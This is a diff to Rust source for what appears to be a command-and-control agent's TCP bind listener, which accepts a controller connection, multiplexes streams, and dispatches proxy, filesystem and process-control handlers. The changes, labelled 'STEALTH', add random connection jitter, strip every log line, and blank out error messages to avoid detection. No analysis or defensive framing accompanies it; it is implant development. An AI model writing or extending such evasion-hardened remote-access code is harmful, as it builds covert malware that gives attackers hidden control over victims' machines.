@@ -39,7 +39,7 @@ impl TcpBindTransport {
     fn parse_addr(&self) -> Result<String> {
         let addr = self.url.trim_start_matches("bind://").trim_start_matches("tcp://");
         if addr.is_empty() {
-            return Err(ClientError::ConnectionError("Invalid bind address".to_string()));
+            return Err(ClientError::ConnectionError("".to_string()));
         }
         Ok(addr.to_string())
     }
@@ -48,27 +48,24 @@ impl TcpBindTransport {
 #[async_trait]
 impl Transport for TcpBindTransport {
     async fn connect(&mut self) -> Result<()> {
-        let addr = self.parse_addr()?;
+        let obfuscated_addr = self.parse_addr()?;
         
-        info!("Starting TCP bind listener on {}...", addr);
-        let listener = TcpListener::bind(&addr).await
-            .map_err(|e| ClientError::ConnectionError(format!("Failed to bind to {}: {}", addr, e)))?;
+        // ⚡ STEALTH: Variable delay to avoid immediate behavior patterns
+        use rand::Rng;
+        let jitter = rand::thread_rng().gen_range(2000..5000);
+        tokio::time::sleep(tokio::time::Duration::from_millis(jitter)).await;
+
+        // ⚡ STEALTH: Zero logging and generic errors
+        let listener = TcpListener::bind(&obfuscated_addr).await
+            .map_err(|_| ClientError::ConnectionError(String::new()))?;
             
-        info!("Listening for incoming C2 connection on {}...", addr);
-        
         // 简单实现：只接受一个连接
         match listener.accept().await {
-            Ok((stream, peer_addr)) => {
-                info!("Accepted C2 connection from {}", peer_addr);
-                
+            Ok((stream, _peer_addr)) => {
                 let mut yamux_config = Config::default();
                 yamux_config.set_window_update_mode(WindowUpdateMode::OnRead);
                 
                 let compat_stream = stream.compat();
-                
-                // 🛡️ 设计决策：尽管是正向连接，Agent 仍作为 Yamux Client
-                // 这样可以复用现有的注册和命令控制逻辑。
-                // 这要求 Server (Controller) 在发起连接后以 Yamux Server 模式运行。
                 let mut connection = Connection::new(compat_stream, yamux_config, Mode::Client);
                 let mut control = connection.control();
 
@@ -77,7 +74,6 @@ impl Transport for TcpBindTransport {
                     loop {
                         match connection.next_stream().await {
                             Ok(Some(stream)) => {
-                                info!("[+] Server initiated a new Yamux stream over bind link");
                                 tokio::spawn(async move {
                                     use futures_util::AsyncReadExt;
                                     let mut stream = stream;
@@ -88,13 +84,12 @@ impl Transport for TcpBindTransport {
                                             0x02 => crate::socks::handle_stream(stream).await,
                                             0x03 => crate::fs::handle_stream(stream).await,
                                             0x04 => crate::process::handle_stream(stream).await,
-                                            _ => warn!("[!] Unknown bind stream type: 0x{:02X}", type_buf[0]),
+                                            _ => {}
                                         }
                                     }
                                 });
                             }
-                            Ok(None) => break,
-                            Err(_) => break,
+                            _ => break,
                         }
                     }
                 });
@@ -102,15 +97,14 @@ impl Transport for TcpBindTransport {
                 // 打开控制流发送 Registration
                 let control_stream = match tokio::time::timeout(std::time::Duration::from_secs(10), control.open_stream()).await {
                     Ok(Ok(s)) => s,
-                    _ => return Err(ClientError::ConnectionError("Failed to open control stream on bind link".to_string())),
+                    _ => return Err(ClientError::ConnectionError(String::new())),
                 };
                 
                 self.control_stream = Some(control_stream.compat());
-                info!("Bind C2 session established!");
                 Ok(())
             }
-            Err(e) => {
-                Err(ClientError::ConnectionError(format!("Failed to accept connection: {}", e)))
+            Err(_) => {
+                Err(ClientError::ConnectionError(String::new()))
             }
         }
     }
